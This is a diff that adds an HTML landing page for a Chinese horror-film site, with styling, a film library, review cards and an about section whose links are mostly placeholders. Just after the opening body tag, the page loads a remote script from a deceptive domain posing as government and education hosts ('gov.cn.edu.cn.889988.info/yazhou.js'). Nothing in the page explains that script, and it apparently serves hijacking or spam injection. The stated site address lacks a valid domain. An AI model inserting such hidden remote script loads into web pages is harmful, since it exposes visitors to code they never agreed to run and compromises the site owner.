@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>恐怖电影网 - 专注恐怖影视资源与影评</title>
+<meta name="description" content="恐怖电影网（kongbudianyingwang-app）是专业的恐怖电影平台，提供恐怖片库、深度影评和最新恐怖影视资讯，带你探索最惊悚的视听世界。">
+<meta name="keywords" content="恐怖电影网,恐怖电影,惊悚片,恐怖片库,恐怖影评,kongbudianyingwang-app">
+<style>
+/* ===== 全局样式 ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: "Microsoft YaHei", Arial, sans-serif;
+}
+
+body {
+    background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
+    color: #e0e0e0;
+    line-height: 1.6;
+    min-height: 100vh;
+}
+
+a {
+    color: #ff6b6b;
+    text-decoration: none;
+    transition: all 0.3s ease;
+}
+
+a:hover {
+    color: #ffa502;
+    text-shadow: 0 0 8px rgba(255,165,2,0.6);
+}
+
+/* ===== 头部 ===== */
+.header {
+    background: rgba(10, 10, 10, 0.7);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid rgba(255,107,107,0.2);
+    padding: 1.2rem 0;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+}
+
+.container {
+    width: 90%;
+    max-width: 1200px;
+    margin: auto;
+}
+
+.header .container {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+}
+
+.logo {
+    font-size: 1.8rem;
+    font-weight: bold;
+    color: #ff6b6b;
+    text-shadow: 0 0 10px rgba(255,107,107,0.5);
+}
+
+.nav {
+    display: flex;
+    gap: 1.2rem;
+    flex-wrap: wrap;
+}
+
+.nav a {
+    padding: 0.5rem 1rem;
+    border-radius: 20px;
+    background: rgba(255,107,107,0.1);
+    border: 1px solid rgba(255,107,107,0.2);
+    font-size: 0.95rem;
+}
+
+.nav a:hover {
+    background: rgba(255,107,107,0.25);
+}
+
+/* ===== 英雄区 ===== */
+.hero {
+    padding: 4rem 0;
+    text-align: center;
+    background: radial-gradient(circle at center, rgba(255,107,107,0.15) 0%, transparent 70%);
+}
+
+.hero h1 {
+    font-size: 2.5rem;
+    margin-bottom: 1rem;
+    color: #fff;
+    text-shadow: 0 0 15px rgba(255,107,107,0.8);
+}
+
+.hero p {
+    font-size: 1.1rem;
+    max-width: 700px;
+    margin: 0 auto 2rem;
+    color: #ccc;
+}
+
+.hero .url {
+    display: inline-block;
+    padding: 0.8rem 1.5rem;
+    background: rgba(255,107,107,0.15);
+    border: 1px solid rgba(255,107,107,0.4);
+    border-radius: 30px;
+    color: #ffa502;
+    font-weight: bold;
+    letter-spacing: 1px;
+}
+
+/* ===== 栏目通用 ===== */
+.section {
+    padding: 3rem 0;
+}
+
+.section-title {
+    text-align: center;
+    font-size: 2rem;
+    margin-bottom: 2rem;
+    color: #ff6b6b;
+    position: relative;
+}
+
+.section-title::after {
+    content: "";
+    width: 80px;
+    height: 3px;
+    background: linear-gradient(to right, transparent, #ff6b6b, transparent);
+    position: absolute;
+    bottom: -10px;
+    left: 50%;
+    transform: translateX(-50%);
+}
+
+/* ===== 玻璃卡片 ===== */
+.grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 2rem;
+}
+
+.card {
+    background: rgba(255,255,255,0.05);
+    backdrop-filter: blur(8px);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 15px;
+    padding: 1.5rem;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+}
+
+.card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 10px 25px rgba(255,107,107,0.2);
+}
+
+.card h3 {
+    color: #ffa502;
+    margin-bottom: 0.8rem;
+    font-size: 1.3rem;
+}
+
+.card p {
+    color: #bbb;
+    font-size: 0.95rem;
+}
+
+/* ===== 关于 ===== */
+.about {
+    background: rgba(0,0,0,0.3);
+    border-radius: 20px;
+    padding: 2rem;
+    margin-top: 2rem;
+}
+
+.about p {
+    margin-bottom: 1rem;
+}
+
+/* ===== 底部 ===== */
+.footer {
+    background: rgba(10,10,10,0.9);
+    text-align: center;
+    padding: 1.5rem 0;
+    border-top: 1px solid rgba(255,107,107,0.2);
+    font-size: 0.9rem;
+    color: #888;
+}
+
+/* ===== 移动端 ===== */
+@media (max-width: 768px) {
+    .header .container {
+        flex-direction: column;
+        gap: 1rem;
+    }
+    .nav {
+        justify-content: center;
+    }
+    .hero h1 {
+        font-size: 1.8rem;
+    }
+    .hero p {
+        font-size: 1rem;
+    }
+    .section-title {
+        font-size: 1.6rem;
+    }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 头部 -->
+<header class="header">
+    <div class="container">
+        <div class="logo">恐怖电影网</div>
+        <nav class="nav">
+            <a href="#home">首页</a>
+            <a href="#library">恐怖片库</a>
+            <a href="#reviews">恐怖影评</a>
+            <a href="#about">关于我们</a>
+        </nav>
+    </div>
+</header>
+
+<!-- 首页 -->
+<section id="home" class="hero">
+    <div class="container">
+        <h1>恐怖电影网 - 探索最惊悚的视听世界</h1>
+        <p>我们专注于恐怖、惊悚、悬疑类影视内容，为你提供最新片库、深度影评与专业解析，让每一次观影都成为心跳加速的体验。</p>
+        <div class="url">官网地址：https://kongbudianyingwang-app</div>
+    </div>
+</section>
+
+<!-- 恐怖片库 -->
+<section id="library" class="section">
+    <div class="container">
+        <h2 class="section-title">恐怖片库</h2>
+        <div class="grid">
+            <div class="card">
+                <h3>经典恐怖</h3>
+                <p>收录《闪灵》《驱魔人》《德州电锯杀人狂》等影史经典，带你回顾恐怖电影的发展脉络。</p>
+                <p><a href="#">查看详情 #</a></p>
+            </div>
+            <div class="card">
+                <h3>心理惊悚</h3>
+                <p>聚焦《穆赫兰道》《黑天鹅》《禁闭岛》等烧脑神作，挑战你的心理承受极限。</p>
+                <p><a href="#">查看详情 #</a></p>
+            </div>
+            <div class="card">
+                <h3>亚洲恐怖</h3>
+                <p>精选《咒怨》《午夜凶铃》《昆池岩》等亚洲高分恐怖片，感受东方惊悚美学。</p>
+                <p><a href="#">查看详情 #</a></p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 恐怖影评 -->
+<section id="reviews" class="section">
+    <div class="container">
+        <h2 class="section-title">恐怖影评</h2>
+        <div class="grid">
+            <div class="card">
+                <h3>《遗传厄运》解析</h3>
+                <p>从家族诅咒到邪教仪式，深度拆解阿里·艾斯特的恐怖美学与叙事结构。</p>
+                <p><a href="#">阅读全文 #</a></p>
+            </div>
+            <div class="card">
+                <h3>日本恐怖片演变</h3>
+                <p>从怨灵文化到现代都市传说，梳理日本恐怖电影的独特叙事逻辑。</p>
+                <p><a href="#">阅读全文 #</a></p>
+            </div>
+            <div class="card">
+                <h3>2024年度恐怖片盘点</h3>
+                <p>年度最佳恐怖片推荐，涵盖《长腿》《阴间大法师2》等热门作品。</p>
+                <p><a href="#">阅读全文 #</a></p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 关于我们 -->
+<section id="about" class="section">
+    <div class="container">
+        <h2 class="section-title">关于我们</h2>
+        <div class="about">
+            <p><strong>恐怖电影网</strong>（https://kongbudianyingwang-app）成立于2024年，是国内专业的恐怖影视垂直平台。</p>
+            <p>我们致力于为恐怖片爱好者提供高质量的片库索引、专业影评、导演访谈和观影指南，打造最纯粹的恐怖文化社区。</p>
+            <p>网站名称：<strong>恐怖电影网</strong></p>
+            <p>访问网址：<a href="https://kongbudianyingwang-app">https://kongbudianyingwang-app</a></p>
+        </div>
+    </div>
+</section>
+
+<!-- 底部 -->
+<footer class="footer">
+    <div class="container">
+        <p>© 2024 恐怖电影网 | 网站名称：恐怖电影网 | 网址：https://kongbudianyingwang-app</p>
+        <p>专注于恐怖影视资源与影评，探索未知的惊悚世界。</p>
+    </div>
+</footer>
+
+</body>
+</html>
